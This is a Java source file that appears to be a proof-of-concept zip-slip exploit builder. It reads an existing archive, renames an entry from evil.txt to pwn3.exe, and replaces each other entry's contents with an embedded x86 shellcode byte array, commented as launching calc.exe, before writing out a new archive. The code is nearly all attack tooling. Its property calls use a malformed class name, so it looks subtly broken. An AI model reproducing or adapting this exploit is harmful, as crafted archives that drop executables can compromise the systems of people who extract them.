package javaapplication20;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.util.Enumeration;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;

/**
 *
 * @author rot
 */
public class JavaApplication20 {
    //path for the zip-slip.zip file
    public static String PBC=(JavaApplication20System.getProperty("user.dir")+"/build/classes/javaapplication20/zip-slip.zip");
    //path to drop the file on
   public static String PVC=(JavaApplication20System.getProperty("user.dir")+"/build/classes/javaapplication20/CVP.zip");
   //calc.exe open file byte code
 public static byte buffer[] = new byte[]
{
	(byte) 0xfc, (byte) 0xe8, (byte) 0x82, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x60, (byte) 0x89,
	(byte) 0xe5, (byte) 0x31, (byte) 0xc0, (byte) 0x64, (byte) 0x8b, (byte) 0x50, (byte) 0x30, (byte) 0x8b,
	(byte) 0x52, (byte) 0x0c, (byte) 0x8b, (byte) 0x52, (byte) 0x14, (byte) 0x8b, (byte) 0x72, (byte) 0x28,
	(byte) 0x0f, (byte) 0xb7, (byte) 0x4a, (byte) 0x26, (byte) 0x31, (byte) 0xff, (byte) 0xac, (byte) 0x3c,
	(byte) 0x61, (byte) 0x7c, (byte) 0x02, (byte) 0x2c, (byte) 0x20, (byte) 0xc1, (byte) 0xcf, (byte) 0x0d,
	(byte) 0x01, (byte) 0xc7, (byte) 0xe2, (byte) 0xf2, (byte) 0x52, (byte) 0x57, (byte) 0x8b, (byte) 0x52,
	(byte) 0x10, (byte) 0x8b, (byte) 0x4a, (byte) 0x3c, (byte) 0x8b, (byte) 0x4c, (byte) 0x11, (byte) 0x78,
	(byte) 0xe3, (byte) 0x48, (byte) 0x01, (byte) 0xd1, (byte) 0x51, (byte) 0x8b, (byte) 0x59, (byte) 0x20,
	(byte) 0x01, (byte) 0xd3, (byte) 0x8b, (byte) 0x49, (byte) 0x18, (byte) 0xe3, (byte) 0x3a, (byte) 0x49,
	(byte) 0x8b, (byte) 0x34, (byte) 0x8b, (byte) 0x01, (byte) 0xd6, (byte) 0x31, (byte) 0xff, (byte) 0xac,
	(byte) 0xc1, (byte) 0xcf, (byte) 0x0d, (byte) 0x01, (byte) 0xc7, (byte) 0x38, (byte) 0xe0, (byte) 0x75,
	(byte) 0xf6, (byte) 0x03, (byte) 0x7d, (byte) 0xf8, (byte) 0x3b, (byte) 0x7d, (byte) 0x24, (byte) 0x75,
	(byte) 0xe4, (byte) 0x58, (byte) 0x8b, (byte) 0x58, (byte) 0x24, (byte) 0x01, (byte) 0xd3, (byte) 0x66,
	(byte) 0x8b, (byte) 0x0c, (byte) 0x4b, (byte) 0x8b, (byte) 0x58, (byte) 0x1c, (byte) 0x01, (byte) 0xd3,
	(byte) 0x8b, (byte) 0x04, (byte) 0x8b, (byte) 0x01, (byte) 0xd0, (byte) 0x89, (byte) 0x44, (byte) 0x24,
	(byte) 0x24, (byte) 0x5b, (byte) 0x5b, (byte) 0x61, (byte) 0x59, (byte) 0x5a, (byte) 0x51, (byte) 0xff,
	(byte) 0xe0, (byte) 0x5f, (byte) 0x5f, (byte) 0x5a, (byte) 0x8b, (byte) 0x12, (byte) 0xeb, (byte) 0x8d,
	(byte) 0x5d, (byte) 0x6a, (byte) 0x01, (byte) 0x8d, (byte) 0x85, (byte) 0xb2, (byte) 0x00, (byte) 0x00,
	(byte) 0x00, (byte) 0x50, (byte) 0x68, (byte) 0x31, (byte) 0x8b, (byte) 0x6f, (byte) 0x87, (byte) 0xff,
	(byte) 0xd5, (byte) 0xbb, (byte) 0xf0, (byte) 0xb5, (byte) 0xa2, (byte) 0x56, (byte) 0x68, (byte) 0xa6,
	(byte) 0x95, (byte) 0xbd, (byte) 0x9d, (byte) 0xff, (byte) 0xd5, (byte) 0x3c, (byte) 0x06, (byte) 0x7c,
	(byte) 0x0a, (byte) 0x80, (byte) 0xfb, (byte) 0xe0, (byte) 0x75, (byte) 0x05, (byte) 0xbb, (byte) 0x47,
	(byte) 0x13, (byte) 0x72, (byte) 0x6f, (byte) 0x6a, (byte) 0x00, (byte) 0x53, (byte) 0xff, (byte) 0xd5,
	(byte) 0x63, (byte) 0x61, (byte) 0x6c, (byte) 0x63, (byte) 0x2e, (byte) 0x65, (byte) 0x78, (byte) 0x65,
	(byte) 0x00
};

    public static void main(String[] args) throws FileNotFoundException, IOException {
        //
        FileInputStream fis = new FileInputStream(PBC); 
        ZipInputStream jis = new ZipInputStream(fis); 
        FileOutputStream fos = new FileOutputStream(PVC);
    	ZipOutputStream zos = new ZipOutputStream(fos);
        PrintStream cout=System.out; 
  
        //reading the next ZIP file entry 
         ZipFile zipFile = new ZipFile(PBC);
     Enumeration entries = zipFile.entries();
   while (entries.hasMoreElements()) {
      ZipEntry e = (ZipEntry)entries.nextElement();
      //change the name or the path if you want..
      ZipEntry x = new ZipEntry(e.getName().replaceAll("evil.txt", "pwn3.exe"));
      zos.putNextEntry(x);
      InputStream is = zipFile.getInputStream(e);
      if(e.getName().matches("good.php")){
                byte[] buf = new byte[1024];
            int len;
            while ((len = (is.read(buf))) > 0) {
                zos.write(buf, 0, (len < buf.length) ? len : buf.length);  
            }
                    }else{
        
         
         for(byte s_o:buffer){
             zos.write(s_o);
             
         }
     }
   }
    zos.closeEntry();
    zos.close();
}}
